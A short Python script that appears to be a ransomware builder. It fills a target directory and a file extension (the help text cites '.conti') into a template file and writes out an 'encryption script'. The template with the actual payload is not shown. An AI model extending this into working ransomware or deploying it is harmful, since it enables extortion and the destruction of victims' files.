import os, sys, argparse

parser = argparse.ArgumentParser(description="Create encryption script",
                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-d", "--dir", help="Directory with files to be encrypted")
parser.add_argument("-e", "--extension",  help="Extension to be used (.YZXXX or .conti for example)")
parser.add_argument("-o", "--output",  help="Output file destination")
args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])

with open('default.txt', 'r') as file:
    data = file.read()

data = data.replace('{dir}', args.dir)
data = data.replace('{extension}', args.extension)

with open(args.output, 'w') as file:
    file.write(data)
